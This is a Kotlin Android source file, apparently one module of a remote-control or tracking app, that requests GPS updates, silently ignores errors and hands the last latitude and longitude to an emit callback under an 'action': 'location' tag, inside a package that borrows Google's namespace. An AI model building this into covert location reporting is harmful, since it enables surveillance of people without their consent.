package com.google.appmods

import android.content.Context
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.os.Bundle
import org.json.JSONObject

object LocationService {
    var loc: Location? = null
    
    fun start(ctx: Context) {
        val lm = ctx.getSystemService(Context.LOCATION_SERVICE) as LocationManager
        
        val l = object : LocationListener {
            override fun onLocationChanged(l: Location) {
                loc = l
            }
            override fun onStatusChanged(p: String?, s: Int, e: Bundle?) {}
            override fun onProviderEnabled(p: String) {}
            override fun onProviderDisabled(p: String) {}
        }
        
        try {
            lm.requestLocationUpdates(LocationManager.GPS_PROVIDER, 10000L, 5f, l)
        } catch (e: Exception) {}
    }
    
    fun sendLast(ctx: Context, emit: (JSONObject) -> Unit) {
        val o = JSONObject().put("action", "location")
        
        if (loc != null) {
            o.put("lat", loc!!.latitude)
            o.put("lng", loc!!.longitude)
        }
        
        emit(o)
    }
}
